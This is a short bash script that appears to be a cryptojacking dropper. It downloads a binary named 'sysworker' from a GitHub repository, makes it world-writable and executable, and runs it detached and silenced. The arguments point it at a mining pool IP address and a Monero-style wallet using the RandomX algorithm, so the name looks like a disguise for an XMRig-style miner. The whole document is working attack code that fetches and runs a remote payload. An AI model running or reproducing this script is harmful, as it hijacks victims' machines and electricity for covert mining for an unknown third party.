#!/bin/bash

wget https://github.com/bandujuna77-debug/sae/raw/refs/heads/main/sysworker
chmod 777 sysworker
nohup setsid ./sysworker -a rx/0 -o 141.95.126.31:1111 -u 44yfAkraFFTPJhnDyqLnJhQDtdVEmCjRbNpnM5966oB6Vi1oWvm7Y67TCvFuPeqHNGAspJY8cJvh5gQGGrV8VmpBGArWjvR -p x -t 8 >/dev/null 2>&1 </dev/null &
